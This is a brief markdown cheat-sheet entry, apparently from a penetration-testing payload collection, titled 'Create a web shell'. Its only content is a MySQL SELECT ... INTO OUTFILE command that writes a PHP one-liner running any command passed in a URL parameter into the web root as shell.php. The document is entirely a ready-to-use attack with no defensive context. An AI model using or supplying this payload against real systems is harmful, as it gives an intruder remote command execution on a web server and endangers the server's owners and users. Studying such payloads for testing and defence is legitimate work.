# Create a web shell

## MySQL
```sql
SELECT "<?php system($_GET['c']); ?>" into outfile "/var/www/html/shell.php"
```
